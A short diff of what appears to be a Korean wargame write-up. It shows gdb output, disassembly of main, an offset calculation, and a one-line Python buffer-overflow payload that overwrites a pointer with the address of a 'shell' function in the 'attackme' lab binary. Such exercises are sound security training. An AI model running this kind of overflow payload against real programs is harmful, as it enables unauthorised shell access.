@@ -101,9 +101,13 @@ End of assembler dump.
 (gdb) p shell
 
 $1 = {<text variable, no debug info>} 0x80484d0 <shell>
-
+출처: http://savefile.tistory.com/152 [해커 스토리]
 ~~~
-
+>0x0804851e <main+6>:    mov    DWORD PTR [ebp-16],0x8048500
+>0x08048525 <main+13>:   sub    esp,0x4
+>0x08048528 <main+16>:   push   ds:0x80496e8
+>0x0804852e <main+22>:   push   0x30
+>0x08048530 <main+24>:   lea    eax,[ebp-56]
+>> 56-16 =40;
 공격코드 : (python -c 'print "A"*40+"\xd0\x84\x04\x08"';cat) | ./attackme
 
-출처: http://savefile.tistory.com/152 [해커 스토리]
